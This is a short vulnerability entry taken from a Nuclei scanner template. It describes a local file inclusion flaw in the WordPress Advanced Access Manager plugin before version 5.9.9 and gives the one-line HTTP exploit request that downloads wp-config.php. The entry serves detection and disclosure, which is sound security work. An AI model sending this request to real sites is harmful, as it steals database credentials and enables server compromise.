# Vulnerability: WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`advanced-access-manager-lfi.yaml`)

## Description
WordPress Advanced Access Manager versions before 5.9.9 are vulnerable to local file inclusion and allows attackers to download the wp-config.php file and get access to the database, which is publicly reachable on many servers.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?aam-media=wp-config.php
```

